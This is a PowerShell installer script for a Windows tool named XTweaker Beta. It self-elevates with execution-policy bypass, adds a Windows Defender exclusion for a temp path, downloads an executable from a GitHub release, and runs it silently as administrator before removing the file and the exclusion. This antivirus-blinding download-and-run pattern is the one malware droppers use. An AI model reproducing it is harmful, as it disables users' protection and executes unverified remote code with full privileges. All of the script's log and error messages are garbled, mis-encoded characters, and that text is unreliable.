$tempPath = [System.IO.Path]::GetTempPath()
$filename = Join-Path -Path $tempPath -ChildPath "XTweakerSetupBeta.exe"
$url = "https://github.com/GoBobDev/XTweakerBeta/releases/latest/download/XTweakerSetupBeta.exe"

function Write-Log {
    param (
        [string]$message
    )
    Write-Host "[INFO] $message"
}

function Add-DefenderExclusion {
    param (
        [string]$path
    )
    Write-Log "��������� ���� $path � ������ ���������� Windows Defender..."
    try {
        Add-MpPreference -ExclusionPath $path
        Write-Log "���� $path ������� �������� � ������ ����������."
    } catch {
        Write-Host "[ERROR] �� ������� �������� ���� � ������ ���������� Windows Defender: $_"
        exit 1
    }
}

function Remove-DefenderExclusion {
    param (
        [string]$path
    )
    Write-Log "������� ���� $path �� ������ ���������� Windows Defender..."
    try {
        Remove-MpPreference -ExclusionPath $path
        Write-Log "���� $path ������� ������ �� ������ ����������."
    } catch {
        Write-Host "[ERROR] �� ������� ������� ���� �� ������ ���������� Windows Defender: $_"
    }
}

function Test-Admin {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    $adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator
    return $principal.IsInRole($adminRole)
}

if (-not (Test-Admin)) {
    Write-Log "������ ������ ���� ������� � ������� ��������������."
    Start-Process powershell -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File `"" + $PSCommandPath + "`"") -Verb RunAs
    exit
}

try {
    Add-DefenderExclusion -path $filename

    Write-Log "��������� ����..."
    Invoke-WebRequest -Uri $url -OutFile $filename -ErrorAction Stop

    if (Test-Path $filename) {
        Write-Log "���� ������� ������."
    } else {
        throw "������ ��� ���������� �����."
    }

    $command = "& {Start-Process -FilePath $filename -ArgumentList '/VERYSILENT' -Verb RunAs}"

    Write-Log "��������� ���� � ����������� /VERYSILENT �� ����� ��������������..."
    Invoke-Expression $command

    Write-Log "��������� ���������."

    Write-Log "������� ����..."
    Remove-Item $filename -ErrorAction Stop

    Remove-DefenderExclusion -path $filename

    Write-Log "������ ��������. ������� ����� ������� ��� ������."
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

} catch {
    Write-Host "[ERROR] ��������� ������: $_"
    Write-Host "������� ����� ������� ��� ������."
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}
